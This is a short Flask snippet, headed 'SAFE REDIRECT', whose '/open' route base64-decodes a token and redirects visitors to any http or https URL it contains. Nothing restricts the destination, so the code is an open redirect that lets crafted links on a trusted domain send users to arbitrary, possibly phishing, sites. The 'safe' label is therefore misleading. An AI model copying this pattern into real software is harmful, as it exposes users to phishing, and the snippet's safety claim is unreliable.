# ================== SAFE REDIRECT ==================

def b64_decode_url(token: str) -> Optional[str]:
    try:
        padded = token + "=" * (-len(token) % 4)
        url = base64.urlsafe_b64decode(padded).decode()
        if url.startswith(("http://", "https://")):
            return url
    except:
        return None

@app.route("/open")
def open_redirect():
    token = request.args.get("t", "")
    url = b64_decode_url(token)
    if not url:
        abort(400)

    return redirect(url, code=302)

